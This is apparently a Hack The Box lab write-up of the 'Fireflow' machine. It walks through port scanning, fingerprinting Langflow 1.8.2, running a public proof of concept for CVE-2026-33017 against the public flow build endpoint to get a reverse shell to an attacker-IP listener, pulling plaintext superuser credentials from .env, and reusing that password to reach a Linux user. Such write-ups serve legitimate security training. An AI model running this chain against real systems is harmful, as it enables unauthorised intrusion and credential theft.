# Fireflow — HTB Machine

**Platform:** Hack The Box
**Difficulty:** Medium
**Type:** Linux Machine
**Objective:** Obtain user and root flags
**Key Vulnerability:** CVE-2026-33017 — Langflow public flow build endpoint code injection (RCE)
**Status:** User flag obtained. Root pending.

---

## Attack Flow

```text
Nmap scan --> 22/443 open, 9100 filtered
443 redirects to fireflow.htb --> add to /etc/hosts
AI Agent section --> subdomain flow.fireflow.htb --> add to /etc/hosts
Langflow login discovered --> /api/v1/version leaks v1.8.2
Research --> CVE-2026-33017
Exploit build_public_tmp endpoint --> reverse shell (www-data)
linpeas/.env --> Langflow superuser credentials leaked
Credential reuse --> su nightfall --> user.txt
Root: not yet solved
```

---

## 1. Port Scan

```bash
sudo nmap 10.129.59.47 -sS -n -Pn -F -oN scan
```

```text
PORT     STATE    SERVICE
22/tcp   open     ssh
443/tcp  open     https
9100/tcp filtered jetdirect
```

---

## 2. Version Scan & Hostname Discovery

```bash
nmap -sS -n -Pn -p 22,443 -oN scanversion -A 10.129.59.47
```

The SSL certificate on port 443 is issued for `fireflow.htb` / `*.fireflow.htb`, and direct IP access errors out. Add to hosts:

```
10.129.59.47 fireflow.htb
```

---

## 3. Subdomain Discovery

The site's "AI Agent" link points to an unresolved subdomain:

```
10.129.59.47 fireflow.htb flow.fireflow.htb
```

This resolves to a **Langflow** login page.

---

## 4. Fingerprinting

```
GET /api/v1/version
```

```json
{"version":"1.8.2","main_version":"1.8.2","package":"Langflow"}
```

Version 1.8.2 maps directly to **CVE-2026-33017** — a critical unauthenticated code injection in the public flow build endpoint.

---

## 5. Exploitation

Public PoC used: [EQSTLab/CVE-2026-33017](https://github.com/EQSTLab/CVE-2026-33017) (modified for TLS handling). Endpoint targeted:

```
POST /api/v1/build_public_tmp/{flow-id}/flow
```

A malicious flow node embeds Python code that spawns a reverse shell when the flow is built server-side.

**Listener (required — raw exploit connections drop without one):**
```bash
nc -lvnp 9001
```

**Exploit:**
```bash
python3 exploit.py --url https://flow.fireflow.htb --flow-id <flow-id> --lhost <attacker-ip> --lport 9001
```

Result: shell as `www-data`.

---

## 6. Post-Exploitation & Lateral Movement

Serving `linpeas.sh` from the attacker box and running it on target leaks Langflow's superuser credentials from the process environment (also visible directly in `/etc/langflow/.env`):

```text
LANGFLOW_SUPERUSER=langflow
LANGFLOW_SUPERUSER_PASSWORD=n1ghtm4r3_b4_n1ghtf4ll
```

The `langflow` account doesn't exist as a Linux user, but `/etc/passwd` shows a real account: `nightfall`. The leaked password is reused successfully:

```bash
su nightfall
```

SSH access confirmed with the same credentials (port 22 was open from the start):

```bash
ssh nightfall@fireflow.htb
cat user.txt
```

✅ User flag obtained. Root privilege escalation is still in progress.

---

## Why It Works

- Unauthenticated version endpoint removes any guesswork for an attacker
- The flow-build endpoint executes arbitrary Python with no sandboxing
- The vulnerable endpoint requires no authentication at all
- Superuser secrets sit in plaintext in the process environment and `.env` file
- Password reuse bridges an application-level credential straight to OS-level access

---

## References

- [SonicWall — Langflow AI Code Injection to RCE](https://www.sonicwall.com/blog/langflow-ai-code-injection-to-rce-flaw)
- [NVD — CVE-2026-33017](https://nvd.nist.gov/vuln/detail/cve-2026-33017)
- [EQSTLab CVE-2026-33017 PoC](https://github.com/EQSTLab/CVE-2026-33017)
